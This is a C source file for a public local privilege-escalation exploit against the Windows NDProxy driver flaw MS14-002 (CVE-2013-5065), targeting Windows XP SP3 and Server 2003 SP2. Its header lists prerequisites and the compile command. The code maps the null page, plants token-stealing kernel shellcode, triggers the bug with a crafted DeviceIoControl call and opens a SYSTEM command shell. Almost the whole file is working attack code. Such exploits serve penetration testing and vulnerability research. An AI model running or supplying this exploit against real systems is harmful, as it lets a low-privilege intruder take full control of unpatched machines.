/*
################################################################
# Exploit Title: Windows NDProxy Privilege Escalation (MS14-002)
# Date: 2015-08-03
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows XP SP3 x86
#   Windows XP SP2 x86-64
#   Windows 2003 SP2 x86
#   Windows 2003 SP2 x86-64
#   Windows 2003 SP2 IA-64
# Supported vulnerable software:
#   Windows XP SP3 x86
#   Windows 2003 SP2 x86
# Tested on:
#   Windows XP SP3 x86 EN
#   Windows 2003 SP2 x86 EN
# CVE ID: 2013-5065
################################################################
# Vulnerability description:
#   NDPROXY is a system-provided driver that interfaces WAN
#   miniport drivers, call managers, and miniport call managers
#   to the Telephony Application Programming Interfaces (TAPI)
#   services.
#   The vulnerability is caused when the NDProxy.sys kernel
#   component fails to properly validate input.
#   An attacker who successfully exploited this vulnerability
#   could run arbitrary code in kernel mode (i.e. with SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the existing shell
#       (i.e. exploit usable via a remote shell)
#   Exploit compiling:
#     - # i586-mingw32msvc-gcc MS14-002.c -o MS14-002.exe
#   Exploit prerequisites:
#     - low privilege access to the target (remote shell or RDP)
#     - target not patched (KB2914368 not installed)
#     - service "Routing and Remote Access" running on the target
#       - "Power User" user group can start and stop services
#         - > sc query remoteaccess
#         - > sc start remoteaccess
################################################################
# Thanks to:
#   Andy (C PoC - Win XP SP3)
#   ryujin (Python PoC - Win XP SP3)
################################################################
# References:
#   http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5065
#   https://technet.microsoft.com/en-us/library/security/ms14-002.aspx
#   https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/
#   https://www.exploit-db.com/exploits/30014/
#   https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216%28v=vs.85%29.aspx
################################################################
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>



typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;


typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11,
    SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;


typedef DWORD NTSTATUS;
NTSTATUS (WINAPI *_NtQuerySystemInformation) (SYSTEM_INFORMATION_CLASS SystemInformationClass,
         PVOID SystemInformation,
         ULONG SystemInformationLength,
         PULONG ReturnLength);



static VOID InitFirstPage (void)
{
    PVOID BaseAddress;
    ULONG RegionSize;
    NTSTATUS ReturnCode;
    FARPROC NtAllocateVirtualMemory;

    NtAllocateVirtualMemory = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "NtAllocateVirtualMemory");

    fprintf (stderr, "[+] NtAllocateVirtualMemory@%p\n", NtAllocateVirtualMemory);
    RegionSize = 0xf000;
    BaseAddress = (PVOID) 0x00000001;
    ReturnCode = NtAllocateVirtualMemory (GetCurrentProcess (),
                                         &BaseAddress,
	                                     0,
                                         &RegionSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (ReturnCode != 0)
    {
         fprintf (stderr, "[-] NtAllocateVirtualMemory() failed to map first page\n");
         fprintf (stderr, "    Error code: %#X\n", ReturnCode);
         fflush (stderr);
         ExitProcess (1);
    }
    fprintf (stderr, "[+] BaseAddress: %p, RegionSize: %#x\n", BaseAddress, RegionSize), fflush (stderr);
    FillMemory (BaseAddress, RegionSize, 0x41);
    return;
}



int exploit (unsigned char *shellcode)
{
    DWORD writtenBytes;
    int returnValue;

    InitFirstPage ();

    unsigned char *shellcodeBuffer;
    shellcodeBuffer = (char *) malloc (400);
    memset (shellcodeBuffer, (int) "xCC", 400);
    memcpy (shellcodeBuffer, shellcode, 112);

    returnValue = WriteProcessMemory ((HANDLE) 0xFFFFFFFF, (LPVOID) 0x00000001, shellcodeBuffer, 0x400, &writtenBytes);
    if (returnValue == 0)
    {
        printf ("[-] Attempt to map memory_write failed\n");
        printf ("    Error code: %d\n", GetLastError ());
        exit(1);
    }
    HANDLE ndProxyDeviceHandle = CreateFileA ("\\\\.\\NDProxy", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (ndProxyDeviceHandle == INVALID_HANDLE_VALUE)
    {
        printf ("[-] Creating a device handle on NDProxy failed\n");
        printf ("    Error code: %d\n", GetLastError());
        exit (0);
    }
    DWORD inputBuffer [0x15] = {0};
    DWORD returnedBytes = 0;
    *(inputBuffer + 5) = 0x7030125;
    *(inputBuffer + 7) = 0x34;
    DeviceIoControl (ndProxyDeviceHandle, 0x8fff23cc, inputBuffer, 0x54, inputBuffer, 0x24, &returnedBytes, 0);
    CloseHandle (ndProxyDeviceHandle);
    system ("cmd.exe /T:C0 /K cd c:\\windows\\system32");
    return 0;
}



int main (int argc, char **argv)
{
    if (argc != 2)
    {
        printf ("[*] Usage: %s OS_TYPE\n", argv[0]);
        printf ("           supported OS_TYPE:\n");
        printf ("                  XP  - Windows XP SP3 x86\n");
        printf ("                  2k3 - Windows 2003 SP2 x86\n");
        printf ("[*] Note:  the service \"Routing and Remote Access\"\n");
        printf ("           must be running on the target machine\n");
        exit (0);
    }
    else
    {
        if ((strcmp (argv[1], "xp") == 0) || (strcmp (argv[1], "XP") == 0))
        {
            unsigned char shellcodeXP[] =
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"
            "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B"
            "\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00"
            "\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3";
            exploit (shellcodeXP);
        }
        else if ((strcmp (argv[1], "2k3") == 0) || (strcmp (argv[1], "2K3") == 0))
        {
            unsigned char shellcode2k3[] =
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"
            "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x38\x8B\xC8\x8B"
            "\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x83\xB8\x94\x00\x00\x00"
            "\x04\x75\xEC\x8B\x90\xD8\x00\x00\x00\x89\x91\xD8\x00\x00\x00\xC3";
            exploit (shellcode2k3);
        }
        else
        {
            printf ("[-] Invalid argument\n");
            printf ("    Argument used: %s\n", argv[1]);
            exit(0);
        }
    }
}
